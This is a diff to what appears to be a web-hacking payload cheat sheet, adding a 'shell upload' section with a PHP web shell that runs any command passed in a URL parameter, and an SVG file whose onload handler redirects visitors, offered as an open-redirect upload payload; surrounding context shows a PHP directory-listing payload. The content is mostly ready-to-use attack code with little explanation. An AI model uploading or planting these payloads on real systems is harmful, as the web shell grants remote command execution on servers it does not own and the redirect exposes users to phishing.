@@ -6,6 +6,7 @@
 - [sql scan  ](#SqlScan )
 - [lfi](#lfi).
 - [open redirect](#openRedict)
+- [shell upload](#shellupload)
 
 
 
@@ -723,10 +724,21 @@ payalod=<?php $dir='.'; $file = scandir($dir); print_r($file); ?>
 >
 >[github waf](https://github.com/0xInfection/Awesome-WAF)
 >
->link to web shell 
-
+# shellupload
+>link to web shell
 ```
 <?php system($_GET['cmd']);?
 <?php system('pwd'); ?>
 ```
+# Open Redirect uploading svg files
+```
+<code>
+<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<svg
+onload="window.location='http://www.example.com'"/
+xmlns="http://www.w3.org/2000/svg">
+</svg>
+</code>
+```
+
 
